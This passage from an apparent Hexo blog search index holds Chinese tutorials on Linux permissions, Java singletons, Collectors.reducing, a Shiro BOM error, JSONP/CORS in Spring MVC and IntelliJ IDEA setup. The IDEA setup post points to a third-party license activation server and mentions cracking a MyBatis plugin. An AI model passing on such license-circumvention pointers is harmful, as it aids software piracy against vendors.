        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Spring MVC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux文件权限]]></title>
    <url>%2Fposts%2FLinux_File_Permissions.html</url>
    <content type="text"><![CDATA[查看文件权限在Linux使用 ll -ah 可以看到以下命令。文件权限就存储在 drwxr-xr-x 这十个字符之中。 12345678drwx------ 21 ahao ahao 4.0K 09-22 04:06 .drwxr-xr-x 4 root root 4.0K 09-21 19:26 ..-rw------- 1 ahao ahao 2.0K 09-22 02:59 .bash_history-rw-r--r-- 1 ahao ahao 33 2009-01-22 .bash_logout-rw-r--r-- 1 ahao ahao 176 2009-01-22 .bash_profile-rw-r--r-- 1 ahao ahao 124 2009-01-22 .bashrcdrwx------ 2 ahao ahao 4.0K 09-21 19:29 .chewingdrwxr-xr-x 2 ahao ahao 4.0K 09-21 19:42 Desktop 权限分析Linux的文件权限分为用户权限user 、 用户所在群组权限group 、 其他用户权限other。分别对应各个权限对这个文件的权限。权限也分为 读r 、写w 、 执行x 三种。所以3*3=9, 对应 drwxr-xr-x 后面九个字符。最前面的字符, 则对应着文件的类型, Linux不是以文件后缀名来确定文件类型的。 第1位是文件类型 文件类型 说明 d Directory、目录、文件夹 - 普通文件 l 软链接文件, Link快捷方式 b 区块(block)文件, 储存数据, 以提供系统随机存取的接口设备 c 字符(character)设备文件, 一些串行端口的接口设备, 例如键盘、鼠标(一次性读取装置) s 数据接口文件(sockets), 通常被用在网络上的数据传输 f 数据输送文件(FIFO, pipe), 解决多个程序同时存取一个文件所造成的错误问题 后面九个字符, 三个为一组, 分别是 用户权限user 、 用户所在群组权限group 、 其他用户权限other。每一组有三个权限 读r 、写w 、 执行x, 如果没有权限, 则用 - 代替。 比如 drwxr-xr-x , 说明这是一个目录, 文件所有者有读、写、执行的权限。文件拥有者所在的群组有读、执行权限, 没有写的权限。不在文件拥有者所在群组的用户具有读、执行权限, 没有写的权限。 修改权限 修改群组change group, chgrp [选项] 群组名 文件名, 群组必须在 /etc/group 中存在。 使用 -R 可以递归recursive修改。 修改拥有者change owner, chown [选项] 用户名 文件名, 用户必须在 /etc/passwd 中存在。 使用 -R 可以递归recursive修改。 下面介绍修改权限的两种方法。 数字形式经常可以看到 chmod [选项] 770 文件名这种形式。 使用 -R 可以递归recursive修改。Linux将读、写、执行的权限赋予了权值。读4 、 写2 、 执行1。为什么这样赋值, 这和二进制有关。1为001, 2为010, 4为100。组合后不会产生冲突。比如说drwxr-xr-x rwx , 读写执行, r4+w2+x1=7 r-x , 读执行, r4+x1=5 所以修改权限的命令为 chmod 755 文件名。 字符形式有人说算术记不住, Linux还提供了字符的形式赋予权限。范围有 用户u、用户所在群组g、其他用户o、以上三个a。权限有 读r 、写w 、 执行x。操作运算符有 新增+、移除- 、 赋予=。比如，要设定 drwx------ 为 dr-xr-xr-x。则使用chomd u-w,g+rx,o=rx 文件名 默认权限使用umask命令查看或修改默认权限。umask命令是临时修改重启失效, 永久修改在/etc/profile文件中修改。12345678[ahao@localhost ~]$ umask 0002[ahao@localhost tmp]$ touch file[ahao@localhost tmp]$ mkdir dir[ahao@localhost tmp]$ ll总用量 2drwxrwxr-x. 2 ahao ahao 6 11月 4 16:17 dir-rw-rw-r--. 1 ahao ahao 0 11月 4 16:16 file 这里的0002的第一位代表特殊权限, 后三位代表读写执行的权限掩码。先看后3位。 文件默认权限最大为666, 也就是rw-rw-rw-, 不能被执行。出于安全性考虑。 目录默认权限最大为777, 也就是rwxrwxrwx, 可以被执行, 也就是进入目录。 umask权限用来和最大权限换算成字母(二进制)后进行相减运算。 12345比如文件默认最大权限为666, umask为022换算成字母, rw-rw-rw- 减去 000010010 得到 110100100比如文件默认最大权限为666, umask为033换算成字母, rw-rw-rw- 减去 ----wx-wx 得到 rw-r--r-- 特殊权限请参考另一篇文章 参考资料 鸟哥的Linux私房菜 - 第六章、Linux 的文件权限与目录配置]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[单例模式的最佳实践]]></title>
    <url>%2Fposts%2FThe_Best_practice_for_Singleton_Pattern.html</url>
    <content type="text"><![CDATA[前言单例模式算是设计模式入门的最简单的一个模式, 由于 Java 语言的特性(指令重排序), 导致同时也是最难的一个模式。 所幸, 先驱者Joshua Bloch在Google I/O 2008上的新书Effective Java介绍了单例模式的最佳实践。这本神书我还没来的及看, 但在国外好像备受推崇, 所以有机会还是看看。 Java 5 之后的最佳实践enum 作为枚举关键字, 很难想像到它和 单例模式 联系到一起。但是换种思路, 枚举类只有一个元素, 不就是单例模式了吗?枚举类还可以添加自定义的方法。完全可以当成一个类来使用。123456public enum Foo &#123; INSTANCE; public static Foo getInstance() &#123; return INSTANCE; &#125; public void hello(String msg) &#123; System.out.println("hello "+msg); &#125; public static void main(String[] args) &#123; Foo.getInstance().hello("world"); &#125;&#125; 在Java 5 之前的最佳实践争议太多了, 本来写了一堆。双重锁, 饿汉模式, 懒汉模式, 防止反射攻击等等。想想还是算了, 现在也没多少人在用Java5之前的代码了吧。而且stackoverflow上也有不少反对的声音。具体也可以去看看。 发现我以前还写了一篇单例模式, 当然现在看来, 是有些漏洞的。 参考资料 What is an efficient way to implement a singleton pattern in Java?]]></content>
      <categories>
        <category>编程杂谈</category>
      </categories>
      <tags>
        <tag>最佳实践</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[创建Utils工具类的最佳实践]]></title>
    <url>%2Fposts%2FThe_Best_practice_for_create_Utils_class.html</url>
    <content type="text"><![CDATA[前言有些类我们不希望实例化, 比如 ArrayUtils。实例化这些工具类是没有意义的。 最佳实践 使用 final 、 abstract 修饰 class。 私有化构造函数 构造函数抛出异常1234567891011// abstract类不能直接实例化, 只能由子类实例化// final类不能实例化public abstract class ArrayUtils &#123; // 私有化构造函数, 子类必须调用父类的构造函数, 但是又调用不了 private ArrayUtils() &#123; // 防止反射创建, 抛出异常 throw new AssertionError("工具类不允许实例化"); &#125; // 工具方法 public static void sort(Integer... arr)&#123;&#125;&#125;]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>最佳实践</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[社保卡办理]]></title>
    <url>%2Fposts%2Fapply_for_social_security_card.html</url>
    <content type="text"><![CDATA[前言公司说要办社保卡, 给了我个电脑号, 叫我自己去银行办。然后就请了个假去办社保了。 办理材料 身份证 数码照相回执(随便找个照相馆说要照社保卡的数码回执) 电脑号 流程请了一天假, 跑到建行去办社保卡, 结果说要4个月才能办成, 推荐我到隔壁的招行去办理, 1个月搞定。 What ???????? 你确定你不是招行派来的奸细 ???? 然后跑到招行去, 以为要拿号等好久, 没想到前台叫我打开微信, 找个【电子社保卡】的公众号。 没想到现在的银行竟然也支持微信办理社保卡了。 照着微信公众号的流程办理就好了。 所以我请假过来是干嘛的????? 一天的工资就这样打水漂了。]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Collectors.reducing压缩List&lt;Map&gt;为Map]]></title>
    <url>%2Fposts%2Fhow_to_use_Collectors.reducing_method_to_reducing_List%5BMap%5D_to_Map.html</url>
    <content type="text"><![CDATA[前言reduce操作可以实现从一组元素中生成一个值, 也可以作为downstream下游处理器。本文默认读者已经掌握基本的Stream知识。 结论先大致看下结论, 不懂可以看下面的解释。 identity 只会初始化一次。 identity 在每次 downstream 的时候会重新放到 左值(left) 中。 如果操作 identity 的话, 将会影响下次 downstream 的第一次的 左值(left) 情景重现假设有一个邮递员业务的数据。用json展示。可以复制到【JSON在线解析及格式化验证】进行格式化。就是一个数组，每个元素都包含日期、邮件数量、发送地区的行政区划代码、是否大件行李。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950[ &#123; "date": "2016-01", // 日期 "number": "1", // 邮件数量 "code": "420000", // 发送地区的行政区划代码 "type": "false" // 是否大件行李 &#125;, &#123; "date": "2016-01", "number": "2", "code": "440000", "type": "false" &#125;, &#123; "date": "2016-02", "number": "3", "code": "420000", "type": "false" &#125;, &#123; "date": "2016-03", "number": "4", "code": "420000", "type": "true" &#125;, &#123; "date": "2016-03", "number": "5", "code": "410000", "type": "false" &#125;, &#123; "date": "2016-03", "number": "6", "code": "440000", "type": "true" &#125;, &#123; "date": "2016-04", "number": "7", "code": "420000", "type": "false" &#125;, &#123; "date": "2016-04", "number": "8", "code": "440000", "type": "false" &#125;]; 目标是根据 日期 分组, 根据 是否大件行李 分区, 把结果 List&lt;Map&gt; 压缩成一个 Map&lt;行政区划代码， 数量&gt;。 进行编码123456789101112131415161718192021222324252627282930313233343536373839404142434445public class MyTest&#123; public static void main(String[] args) &#123; List&lt;Map&lt;String, String&gt;&gt; postmans = new ArrayList&lt;&gt;(); // "420000" :行政区划代码, "false": 是否为大件行李 postmans.add(createMap("2016-01", "1", "420000", "false")); postmans.add(createMap("2016-01", "2", "440000", "false")); postmans.add(createMap("2016-02", "3", "420000", "false")); postmans.add(createMap("2016-03", "4", "420000", "true")); postmans.add(createMap("2016-03", "5", "410000", "false")); postmans.add(createMap("2016-03", "6", "440000", "true")); postmans.add(createMap("2016-04", "7", "420000", "false")); postmans.add(createMap("2016-04", "8", "440000", "false")); // 使用 fastjson 打印输出 原始数据 System.out.println(JSONObject.toJSONString(postmans)); Map&lt;String, Map&lt;Boolean, Map&gt;&gt; data = postmans.stream() .collect( Collectors.groupingBy( // 分组 d -&gt; d.get("date"), // 根据 日期 分组 TreeMap::new, // 使用 TreeMap 构造有序 Map Collectors.partitioningBy( d-&gt; d.get("type").equals("true"), // 根据 是否大件行李 分区 Collectors.reducing(new HashMap(), (left, right)-&gt;&#123; // 压缩 List&lt;Map&gt; 为 Map Object code = right.get("code"); Object number = right.get("number"); left.put(code, number); // 这里不应该修改left, 也就是identity return left; &#125;)))); // 使用 fastjson 打印输出 格式化后的数据 System.out.println(JSONObject.toJSONString(data)); &#125; private static Map&lt;String,String&gt; createMap(String date, String number, String code, String type)&#123; Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); map.put("date", date); map.put("number", number); map.put("code", code); map.put("type", type); return map; &#125;&#125; 预期和实际的结果不同很明显, 每次最新的 行政区划代码 和 对应的数量 覆盖了之前的值。可以复制到【JSON在线解析及格式化验证】进行格式化。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778var 预期结果 = &#123; "2016-01": &#123; "false": &#123; "420000": "1", "440000": "2" &#125; &#125;, "2016-02": &#123; "false": &#123; "420000": "3" &#125; &#125;, "2016-03": &#123; "false": &#123; "410000": "5" &#125;, "true": &#123; "420000": "4", "440000": "6" &#125; &#125;, "2016-04": &#123; "false": &#123; "420000": "7", "440000": "8" &#125; &#125;&#125;;var 实际结果= &#123; "2016-01": &#123; "false": &#123; "410000": "5", "420000": "7", "440000": "8" &#125;, "true": &#123; "410000": "5", "420000": "7", "440000": "8" &#125; &#125;, "2016-02": &#123; "false": &#123; "410000": "5", "420000": "7", "440000": "8" &#125;, "true": &#123; "410000": "5", "420000": "7", "440000": "8" &#125; &#125;, "2016-03": &#123; "false": &#123; "410000": "5", "420000": "7", "440000": "8" &#125;, "true": &#123; "410000": "5", "420000": "7", "440000": "8" &#125; &#125;, "2016-04": &#123; "false": &#123; "410000": "5", "420000": "7", "440000": "8" &#125;, "true": &#123; "410000": "5", "420000": "7", "440000": "8" &#125; &#125;&#125;; 问题解决上【stackoverflow】问了下，有人给出了正确的代码。123456789101112131415161718192021Collectors.reducing( new HashMap&lt;&gt;(), (left, right) -&gt; &#123; // 注意这里 new 了个 Map Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); String leftCode = left.get("code"); String leftNumber = left.get("number"); if (leftCode == null) &#123; map.putAll(left); &#125; else &#123; map.put(leftCode, leftNumber); &#125; String rightCode = right.get("code"); String rightNumber = right.get("number"); map.put(rightCode, rightNumber); return map; &#125;) 再结合自己调试之后，发现了几点 identity 只会初始化一次。 identity 在每次 downstream 的时候会重新放到 左值(left) 中。 如果操作 identity 的话, 将会影响下次 downstream 的第一次的 左值(left) 注意我的代码, 我修改了 identity 的值, 造成了之后每次 downstream 重新放到 左值 的 identity 携带了上一次downstream 处理过的参数123456789Collectors.reducing( new HashMap(), (left, right)-&gt;&#123; // 压缩 List&lt;Map&gt; 为 Map Object code = right.get("code"); Object number = right.get("number"); left.put(code, number); // 我修改了 identity 的值 return left; &#125;); 而新的代码, 是重新 new 了个 Map, 没有修改 identity 。保持了 identity 的纯净。 具体调试代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081public class MyTest&#123; public static void main(String[] args) &#123; List&lt;Map&lt;String, String&gt;&gt; postmans = new ArrayList&lt;&gt;(); // "420000" : post area code, "false": just paper(without goods) postmans.add(createMap("2016-01", "1", "420000", "false")); postmans.add(createMap("2016-01", "2", "440000", "false")); postmans.add(createMap("2016-02", "3", "420000", "false")); postmans.add(createMap("2016-03", "4", "420000", "true")); postmans.add(createMap("2016-03", "5", "410000", "false")); postmans.add(createMap("2016-03", "6", "440000", "true")); postmans.add(createMap("2016-04", "7", "420000", "false")); postmans.add(createMap("2016-04", "8", "440000", "false")); // before, I use fastjson Library System.out.println(JSONObject.toJSONString(postmans)); Map&lt;String, Map&lt;Boolean, Map&gt;&gt; data = postmans.stream() .collect(Collectors.groupingBy(d -&gt; d.get("date"), TreeMap::new, Collectors.partitioningBy(d-&gt; d.get("type").equals("true"), Collectors.reducing(newHashMap(), (left, right)-&gt;&#123; System.out.println("开始:"+JSONObject.toJSONString(left)+","+JSONObject.toJSONString(right)); Object code = right.get("code"); Object number = right.get("number"); // I think bug in reducing left.put(code, number); System.out.println("结果:"+JSONObject.toJSONString(left)+"\n"); return left; &#125;)))); // after, I use fastjson Library System.out.println(JSONObject.toJSONString(data)); Map&lt;String, Map&lt;Boolean, Map&lt;String, String&gt;&gt;&gt; test = postmans.stream() .collect(Collectors.groupingBy(d -&gt; d.get("date"), TreeMap::new, Collectors.partitioningBy(d -&gt; d.get("type").equals("true"), Collectors.reducing(newHashMap(), (left, right) -&gt; &#123; Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); System.out.println("开始:"+JSONObject.toJSONString(left)+","+JSONObject.toJSONString(right)); String leftCode = left.get("code"); String leftNumber = left.get("number"); if (leftCode == null) &#123; map.putAll(left); &#125; else &#123; map.put(leftCode, leftNumber); &#125; String rightCode = right.get("code"); String rightNumber = right.get("number"); map.put(rightCode, rightNumber); System.out.println("结果:"+JSONObject.toJSONString(map)+"\n"); return map; &#125;)))); System.out.println(JSONObject.toJSONString(test)); &#125; private static Map&lt;String, String&gt; newHashMap()&#123; Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); map.put("time"+System.currentTimeMillis(), "测试:"+System.currentTimeMillis()); return map; &#125; private static Map&lt;String,String&gt; createMap(String date, String number, String code, String type)&#123; Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); map.put("date", date); map.put("number", number); map.put("code", code); map.put("type", type); return map; &#125;&#125; 结论 identity 只会初始化一次。 identity 在每次 downstream 的时候会重新放到 左值(left) 中。 如果操作 identity 的话, 将会影响下次 downstream 的第一次的 左值(left) 参考资料 java8 Stream List how to covert a Map after groupingBy]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>Java8</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shiro.ini异常Line argument must contain a key and a value. Only one string token was found.]]></title>
    <url>%2Fposts%2FLine_argument_must_contain_a_key_and_a_value._Only_one_string_token_was_found..html</url>
    <content type="text"><![CDATA[前言在读取shiro.ini的时候, 抛出了如下异常1234[users]user1=password1user2=password2;抛出Line argument must contain a key and a value. Only one string token was found. 不科学啊, 我这里都是有键值对的。怎么会说我没有完整的键值对呢? 解决方案在这篇博客找到了解决方案。原来我的 shiro.ini 是 UTF-8 编码的, windows会自动给 UTF-8 编码加上 BOM 。所以使用windows默认笔记本编辑的小伙伴就有福啦~, 被坑了。用 Notepad++ 打开, 点击 编码-&gt;转为UTF-8无BOM编码格式 即可。 为什么改成 无BOM编码 就可以呢?以下是引用或整合的一些信息。 ANSI: ANSI编码表示英文字符时用一个字节，表示中文用两个或四个字节。 ANSI有很多个分支, 比较熟悉的有GB2312、GBK、GB18030、Big5, 这些使用多个字节表示一个字符的编码方式称为ANSI编码。 简体中文Windows是GBK编码。 UTF-8 无BOM 和 UTF-8 这里的BOM不是javascript的Browser Object Model浏览器对象模型。而是Byte Order Mark字节顺序标记 BOM会在文件的开头加入U+FEFF, 相当于一个【看不见的长度为0的空白字符】, 用于区分UTF-8和ASCII编码 windows会自动给UTF-8编码加上BOM。 UTF-8本身是没有字节序的问题的（因为它是以单个字节为最小单位） 参考资料 java.lang.IllegalArgumentException: Line argument must contain a key and a value 百度百科-ANSI 维基百科-字节顺序标记 「带 BOM 的 UTF-8」和「无 BOM 的 UTF-8」有什么区别？网页代码一般使用哪个？ 编码歪传——番外篇]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringMVC支持跨域访问]]></title>
    <url>%2Fposts%2FCross_domain_access_in_Spring_MVC.html</url>
    <content type="text"><![CDATA[前言ajax的跨域访问, Spring MVC提供了使用AOP的解决方案。 什么是跨域访问比如我现在在 http://a.com 中, 要访问 http://b.com, 这就是跨域访问。而一般的 AJAX 是不允许跨域访问的。网上关于跨域的说明有很多, 简单的说, 只要 com 之前的内容不一致, 就叫跨域访问。 JSONP的解决方案(只支持GET)Spring MVC解决方案注意Spring MVC的版本要4.1以上先配置 spring.xml 12345678&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans &gt; &lt;!--扫描aop相关的bean --&gt; &lt;context:component-scan base-package="com.nine.rivers.galaxy" use-default-filters="false"&gt; &lt;!-- 只扫描aop --&gt; &lt;context:include-filter type="annotation" expression="org.springframework.web.bind.annotation.ControllerAdvice"/&gt; &lt;/context:component-scan&gt;&lt;/beans&gt; 添加一个 Advice 和一个 Controller12345678910111213141516171819202122@ControllerAdvice(basePackages = "com.ahao.module.controller")public class MyAdvice extends AbstractJsonpResponseBodyAdvice &#123; public MyAdvice () &#123; // 和下面 ajax 的 jsonp 属性的值要一致 super("callback"); &#125;&#125;// com.ahao.module.controller.TestController// 注意在 MyAdvice 扫描的包下@RestControllerpublic class TestController &#123; // 只支持GET, 使用 fastjson 方便输出 @RequestMapping(value = "/test", method = RequestMethod.GET) public JSONObject test(@RequestParam("size") Integer size) &#123; JSONObject json = new JSONObject(size); for (int i = 0; i &lt; size; i++) &#123; json.put("key"+i, "value"+i); &#125; return json; &#125;&#125; 可以看到 Controller 是一个很普通的 Controller, 那么主要的就是 AbstractJsonpResponseBodyAdvice。从名字看就知道是和 AOP 有关。值的注意的是, 如果把 basePackages 设置为 com 的话, 也就是很大范围的话,那么该范围内所有的 Controller 都将支持 JSONP, 这样违背了最小权限原则。所以 basePackages 范围要尽可能小。配置好后, 启动Tomcat, 新建一个静态页面使用 AJAX 请求。 1234567891011121314151617&lt;div&gt;&lt;/div&gt;&lt;script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"&gt;&lt;/script&gt;&lt;script&gt; $.ajax(&#123; type:"get", dataType:"jsonp", url:"http://localhost:8080/test", jsonp:"callback", // 和 MyAdvice 配置的值要一致 data: &#123;size: '5'&#125;, success : function(json) &#123; $('div').html("成功:"+JSON.stringify(json)); &#125;, error: function(xhr)&#123; $('div').html("失败:"+JSON.stringify(xhr)); &#125; &#125;);&lt;/script&gt; 结果1&lt;div&gt;成功:&#123;"key4":"value4","key3":"value3","key0":"value0","key2":"value2","key1":"value1"&#125;&lt;/div&gt; 为什么不支持POST没有支持post的script标签!!!JSONP的本质, 是通过script标签, 以函数传参的形式来调用。从响应头Content-Type: application/javascript;charset=utf-8就可以看出。如本例中的JSONP请求, 等价于1&lt;script src="http://localhost:8080/szlh/sdlyzwgk/test?callback=jQuery33108767440327735769_1521685929769&amp;size=5&amp;_=1521685929770"&gt;&lt;/script&gt; 后台处理后, 将数据封装成一个JSON对象，返回一串函数1jQuery33108767440327735769_1521685929769(&#123;"key4":"value4","key3":"value3","key0":"value0","key2":"value2","key1":"value1"&#125;); 可以看到jQuery33108767440327735769_1521685929769是函数名, 后台返回的数据封装成了JSON对象参数, 然后浏览器会调用这个函数, 走到success这个方法里面。 CORS的解决方案CORS是一个W3C标准，全称是”跨域资源共享”(Cross-origin resource) 12345678// 允许http://localhost:8081对本机发起CORS访问Access-Control-Allow-Origin: http://localhost:8081// 3628800秒内，不需要再发送预检验请求，可以缓存该结果Access-Control-Max-Age: 3628800// 允许各种方式的请求Access-Control-Allow-Methods: GET, POST, PUT, DELETE// 允许包含的请求头Access-Control-Allow-Headers: content-type 原生解决方案使用过滤器Filter解决, 注册这个过滤器即可。123456789101112// com.ahao.core.filter.CORSFilterpublic class CORSFilter implements Filter&#123; @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; HttpServletResponse response = (HttpServletResponse) servletResponse; response.setHeader("Access-Control-Allow-Origin", "*"); response.setHeader("Access-Control-Allow-Methods", "POST, GET"); response.setHeader("Access-Control-Max-Age", "3600"); response.setHeader("Access-Control-Allow-Headers", "Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With"); filterChain.doFilter(servletRequest, servletResponse); &#125;&#125; SpringMVC解决方案注意Spring MVC的版本要4.2以上使用CrossOrigin注解, 指定允许进行跨域的远程地址http://localhost:8081。如果不指定, 则默认允许所有外来地址跨域访问。1234567891011121314// com.ahao.module.controller.TestController@RestControllerpublic class TestController &#123; // 支持GET、POST, 使用 fastjson 方便输出 @CrossOrigin(origins = "http://localhost:8081") @RequestMapping(value = "/test", method = RequestMethod.POST) public JSONObject test(@RequestParam("size") Integer size) &#123; JSONObject json = new JSONObject(size); for (int i = 0; i &lt; size; i++) &#123; json.put("key"+i, "value"+i); &#125; return json; &#125;&#125; CrossOrigin注解可以加在类上, 也可以加在方法上。如果需要全局都注解的话, 需要在spring配置文件上添加123&lt;mvc:cors&gt; &lt;mvc:mapping path="/**" allowed-origins="http://localhost:8081"/&gt;&lt;/mvc:cors&gt; 参考资料 CORS support in Spring Framework]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Spring MVC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IDEA的LiveTempleate自动生成代码]]></title>
    <url>%2Fposts%2FIDEA_LiveTempleate_Setting.html</url>
    <content type="text"><![CDATA[前言Live Template是IDEA提供的一个自动生成代码的工具, 可以自定义一段小代码, 比如最常见的 System.out.println(&quot;&quot;); , 当然这已经被内置了, 输入 sout即可输出。 自定义xml的存储位置 Windows: 用户目录/.IntelliJ IDEA/config/templates Linux: ~IntelliJ IDEA/config/templates macOS: ~/Library/Preferences/IntelliJ IDEA/templates 当然这在官方文档中有提到 自定义Live Template打开IDEA, 点击工具栏File -&gt; Settings -&gt; Editor -&gt; Live Template, 点击右边的加号+。输入下面的代码。12private static final org.slf4j.Logger logger = org.slf4j.LoggerFactory.getLogger($CLASS_NAME$.class);$END$ 再点击右边的 Edit variables, 选择 Expression 为 className()在代码中输入 logg 即可生成自动生成上面的代码, $CLASS_NAME$ 表示当前的类名。 自用的Live Template1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;templateSet group="user"&gt; &lt;template name="logg" value="private static final org.slf4j.Logger logger = org.slf4j.LoggerFactory.getLogger($CLASS_NAME$.class);&amp;#10;$END$" description="log日志输出器" toReformat="false" toShortenFQNames="true"&gt; &lt;variable name="CLASS_NAME" expression="className()" defaultValue="" alwaysStopAt="true" /&gt; &lt;context&gt; &lt;option name="JAVA_CODE" value="true" /&gt; &lt;/context&gt; &lt;/template&gt; &lt;template name="loge" value="logger.error(&amp;quot;$END$&amp;quot;);" description="log日志error级别" toReformat="false" toShortenFQNames="true"&gt; &lt;context&gt; &lt;option name="JAVA_CODE" value="true" /&gt; &lt;/context&gt; &lt;/template&gt; &lt;template name="logw" value="logger.warn(&amp;quot;$END$&amp;quot;);" description="log日志warn级别" toReformat="false" toShortenFQNames="true"&gt; &lt;context&gt; &lt;option name="JAVA_CODE" value="true" /&gt; &lt;/context&gt; &lt;/template&gt; &lt;template name="logi" value="logger.info(&amp;quot;$END$&amp;quot;);" description="log日志info级别" toReformat="false" toShortenFQNames="true"&gt; &lt;context&gt; &lt;option name="JAVA_CODE" value="true" /&gt; &lt;/context&gt; &lt;/template&gt; &lt;template name="logd" value="logger.debug(&amp;quot;$END$&amp;quot;);" description="log日志debug级别" toReformat="false" toShortenFQNames="true"&gt; &lt;context&gt; &lt;option name="JAVA_CODE" value="true" /&gt; &lt;/context&gt; &lt;/template&gt; &lt;template name="can" value="java.util.Scanner in = new java.util.Scanner(System.in);&amp;#10;int n = in.nextInt();&amp;#10;$END$" description="控制台输入" toReformat="false" toShortenFQNames="true"&gt; &lt;context&gt; &lt;option name="JAVA_CODE" value="true" /&gt; &lt;/context&gt; &lt;/template&gt; &lt;template name="pra" value="java.util.Arrays.toString($END$)" description="打印数组" toReformat="false" toShortenFQNames="true"&gt; &lt;context&gt; &lt;option name="JAVA_CODE" value="true" /&gt; &lt;/context&gt; &lt;/template&gt; &lt;template name="prm" value="for(java.util.Map.Entry entry : $VAR$.entrySet())&#123;&amp;#10; System.out.println(entry.getKey()+&amp;quot; : &amp;quot;+entry.getValue());&amp;#10;&#125;" description="打印Map集合" toReformat="false" toShortenFQNames="true"&gt; &lt;variable name="VAR" expression="" defaultValue="" alwaysStopAt="true" /&gt; &lt;context&gt; &lt;option name="JAVA_CODE" value="true" /&gt; &lt;/context&gt; &lt;/template&gt;&lt;/templateSet&gt; 参考资料 官方文档]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IDEA的基本配置]]></title>
    <url>%2Fposts%2FIDEA_common_setting.html</url>
    <content type="text"><![CDATA[版本选择选择: 2017.3激活: http://idea.liyang.io/ 字体颜色设置 设置主题: File -&gt; Settings -&gt; Appearence&amp;Behavior -&gt; Appearence, 选择 Darcula暗色背景 设置代码字体: File -&gt; Settings -&gt; Editor -&gt; Font, 设置 font 为 Consolas , Size 为 16。 设置控制台字体: File -&gt; Settings -&gt; Editor -&gt; Color Scheme -&gt; Console Font, 设置 font 为 Consolas , Size 为 14。 配置Git在 File -&gt; Settings -&gt; Version Control -&gt; Git -&gt; Path to Git executable 添加 Git路径\bin\git.exe。 中文输入法配置2017.2不支持中文输入法候选框的显示。 找到IDEA在本地安装路径(先把IDEA关闭) 在IDEA安装路径中把jre64文件删除,或者重命名(万一不行可以再改回来…) 找到本地java安装路径,把jre文件夹复制一份.(java安装路径里有jdk和jre的文件夹) 把复制的jre文件夹粘贴在刚才修改jre64位置,重命名为jre64(这样IDEA启动就能找到它) 在java安装路径中找到jdk文件-再找到lib文件-找到tools.jar文件,复制一份 把jar包粘贴到已经重命名过的jre64/lib下 打开IDEA,写一段代码,然后写一段中文注释试试,问题解决~ maven设置在 IntelliJ IDEA 文件夹下新建文件夹 mvnlib,打开 IntelliJ IDEA\plugins\maven\lib\maven2\conf\settings.xml (maven3同理) , 添加如下xml, 注意层级结构1234567891011121314&lt;settings&gt; &lt;!-- maven的下载路径, 默认下载在C盘用户目录下 --&gt; &lt;localRepository&gt;mvnlib的目录&lt;/localRepository&gt; &lt;!-- 阿里云的maven镜像仓库 --&gt; &lt;mirrors&gt; &lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;/mirrors&gt;&lt;/settings&gt; 插件 热部署jrebel: 用Twitter或者Facebook登录获取注册码即可。 findbugs: 找到隐藏比较深的bug Grep Console: 输出彩色日志 ECTranslation: 翻译插件 BashSupport: 执行shell MyBatis插件: 照着说明复制粘贴即可破解, github地址(失效) Live Template Windows: 用户目录/.IntelliJ IDEA/config/templates Linux: ~IntelliJ IDEA/config/templates macOS: ~/Library/Preferences/IntelliJ IDEA/templates1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;templateSet group="user"&gt; &lt;template name="logg" value="private static final org.slf4j.Logger logger = org.slf4j.LoggerFactory.getLogger($CLASS_NAME$.class);&amp;#10;$END$" description="log日志输出器" toReformat="false" toShortenFQNames="true"&gt; &lt;variable name="CLASS_NAME" expression="className()" defaultValue="" alwaysStopAt="true" /&gt; &lt;context&gt; &lt;option name="JAVA_CODE" value="true" /&gt; &lt;/context&gt; &lt;/template&gt; &lt;template name="loge" value="logger.error(&amp;quot;$END$&amp;quot;);" description="log日志error级别" toReformat="false" toShortenFQNames="true"&gt; &lt;context&gt; &lt;option name="JAVA_CODE" value="true" /&gt; &lt;/context&gt; &lt;/template&gt; &lt;template name="logw" value="logger.warn(&amp;quot;$END$&amp;quot;);" description="log日志warn级别" toReformat="false" toShortenFQNames="true"&gt; &lt;context&gt; &lt;option name="JAVA_CODE" value="true" /&gt; &lt;/context&gt; &lt;/template&gt; &lt;template name="logi" value="logger.info(&amp;quot;$END$&amp;quot;);" description="log日志info级别" toReformat="false" toShortenFQNames="true"&gt; &lt;context&gt; &lt;option name="JAVA_CODE" value="true" /&gt; &lt;/context&gt; &lt;/template&gt; &lt;template name="logd" 